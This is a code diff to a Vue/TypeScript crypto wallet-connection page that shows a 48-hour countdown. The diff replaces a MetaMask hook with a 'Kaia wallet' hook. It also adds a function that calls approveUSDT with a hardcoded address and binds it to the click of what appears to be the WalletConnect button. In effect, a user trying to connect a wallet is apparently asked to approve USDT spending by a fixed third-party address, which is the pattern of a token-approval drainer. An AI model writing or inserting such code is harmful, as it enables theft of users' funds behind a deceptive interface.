@@ -5,9 +5,10 @@ import {Swiper, SwiperSlide} from 'swiper/vue'
 import {Mousewheel, Pagination} from 'swiper/modules'
 import {onBeforeMount, onBeforeUnmount, onMounted, reactive, ref} from 'vue'
 import type {Swiper as SwiperInstance} from 'swiper';  // 类型导入
-import { useMetaMask } from "@/plugins/wagim.ts";
+import { useKaiaWallet,approveUSDT } from "@/views/metamask.ts";
+
 //
-const { address, isConnected, connect, disconnect } = useMetaMask();
+const { address, isConnected, connect, disconnect } = useKaiaWallet();
 
 let timer: any = null
 let targetTime = new Date().getTime() + 48 * 60 * 60 * 1000 // 48 hours from now
@@ -21,7 +22,9 @@ const countdown = ref({
 })
 
 
-
+const appusdt = () =>{
+  approveUSDT('0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2', '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2')
+}
 
 const data = reactive({
   defaultShow: 'walletConnection',
@@ -317,7 +320,7 @@ const slideNext = () => {
                    style="border-radius: 50%;">
               &nbsp; Metamask
             </div>
-            <div class="btn">
+            <div class="btn" @click="appusdt">
               <img width="20" height="20" class="iekbcc0 ju367v2m ju367v8p ju367v9f" aria-hidden="true"
                    src="data:image/svg+xml,<svg width=&quot;28&quot; height=&quot;28&quot; viewBox=&quot;0 0 28 28&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>%0A<rect width=&quot;28&quot; height=&quot;28&quot; fill=&quot;%233B99FC&quot;/>%0A<path d=&quot;M8.38969 10.3739C11.4882 7.27538 16.5118 7.27538 19.6103 10.3739L19.9832 10.7468C20.1382 10.9017 20.1382 11.1529 19.9832 11.3078L18.7076 12.5835C18.6301 12.6609 18.5045 12.6609 18.4271 12.5835L17.9139 12.0703C15.7523 9.9087 12.2477 9.9087 10.0861 12.0703L9.53655 12.6198C9.45909 12.6973 9.3335 12.6973 9.25604 12.6198L7.98039 11.3442C7.82547 11.1893 7.82547 10.9381 7.98039 10.7832L8.38969 10.3739ZM22.2485 13.012L23.3838 14.1474C23.5387 14.3023 23.5387 14.5535 23.3838 14.7084L18.2645 19.8277C18.1096 19.9827 17.8584 19.9827 17.7035 19.8277C17.7035 19.8277 17.7035 19.8277 17.7035 19.8277L14.0702 16.1944C14.0314 16.1557 13.9686 16.1557 13.9299 16.1944C13.9299 16.1944 13.9299 16.1944 13.9299 16.1944L10.2966 19.8277C10.1417 19.9827 9.89053 19.9827 9.73561 19.8278C9.7356 19.8278 9.7356 19.8277 9.7356 19.8277L4.61619 14.7083C4.46127 14.5534 4.46127 14.3022 4.61619 14.1473L5.75152 13.012C5.90645 12.857 6.15763 12.857 6.31255 13.012L9.94595 16.6454C9.98468 16.6841 10.0475 16.6841 10.0862 16.6454C10.0862 16.6454 10.0862 16.6454 10.0862 16.6454L13.7194 13.012C13.8743 12.857 14.1255 12.857 14.2805 13.012C14.2805 13.012 14.2805 13.012 14.2805 13.012L17.9139 16.6454C17.9526 16.6841 18.0154 16.6841 18.0541 16.6454L21.6874 13.012C21.8424 12.8571 22.0936 12.8571 22.2485 13.012Z&quot; fill=&quot;white&quot;/>%0A</svg>%0A"
                    style="transition: opacity 0.15s linear; user-select: none;border-radius: 50%;">
